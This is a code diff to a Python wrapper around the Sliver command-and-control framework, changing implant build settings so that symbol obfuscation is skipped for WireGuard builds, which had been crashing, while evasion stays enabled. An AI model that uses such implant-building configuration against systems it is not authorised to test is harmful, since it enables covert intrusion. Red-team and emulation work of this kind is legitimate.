@@ -284,7 +284,11 @@ class SliverClient:
             IsBeacon=bool(beacon),
             BeaconInterval=int(60 * 1e9) if beacon else 0,
             BeaconJitter=int(30 * 1e9) if beacon else 0,
-            TemplateName="sliver", ObfuscateSymbols=not debug, Evasion=True,
+            TemplateName="sliver", Evasion=True,
+            # garble -tiny produced WG clients that died with status 2 on some
+            # seeds; the unobfuscated build connects. WG is the one transport
+            # where symbol obfuscation is not worth a dead implant.
+            ObfuscateSymbols=not debug and transport != "wg",
             Debug=bool(debug),
             ReconnectInterval=int(30 * 1e9), MaxConnectionErrors=0,
             HTTPC2ConfigName="default",
